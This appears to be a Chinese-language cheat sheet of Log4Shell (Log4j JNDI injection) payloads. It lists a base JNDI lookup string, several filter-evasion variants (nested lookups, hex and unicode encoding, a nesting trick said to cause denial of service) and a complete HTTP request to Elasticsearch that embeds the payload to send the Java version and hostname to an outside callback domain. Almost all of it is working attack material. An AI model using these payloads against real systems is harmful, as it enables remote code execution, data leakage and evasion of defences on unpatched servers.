# 记录Log4jshell利用的工具和payload等
## poc

```
原始payload：${jndi:ldap|rmi://127.0.0.1:1389/ass}
关键函数绕过:  ${${lower:jn}${lower:d}i:${lower:rmi}://127.0.0.1:1389/poc}
横杆绕过：     ${::-j}${::-n}${::-d}${::-i}:rmi://127.0.0.1:1389/ass}
空格绕过：      ${j${::-}n${::-}d${::-}i:rmi://127.0.0.1:1389/ass}
任意字符任意长度：${j${amjy:rX:-n}${hh:NLwGqf:-d}${::-i}:ldap://127.0.0.1:1389/ass}
${j${sdf:……%¥df:asdf:rX:-n}${hh:NLwGqf:-d}${::-i}:ldap://127.0.0.1:1389/ass}
多层嵌套(可导致ddos)：${${${${${${::j}}}}}${${${${${::n}${::di}}}}}:ldap|rmi://127.0.0.1:1389/ass}
16进制编码绕过：
\x24{\x6a\x6e\x64\x69:\x6c\x64\x61\x70://1.1.1.1:1389/xx}
// jndi -> \x6a\x6e\x64\x69
// ldap -> \x6c\x64\x61\x70
// rmi -> \x72\x6d\x69       
unicode编码绕过：
\ud83d\ude04${jndi:ldap://1.1.1.1:1389}
```

## ES POC

```
PUT /_template/%24%7bjndi%3aldap%3a%2f%2f%24%7bsys%3ajava.version%7d.%24%7bhostname%7d.accept.bugseek.coffeehb.cn%2fass%7d HTTP/1.1
Host: 41.1.1.1:9200
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36
Content-Type: application/json;charset=UTF-8
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Connection: close
Content-Length: 38

{
"index_patterns":["teju*","bar"]
}
```
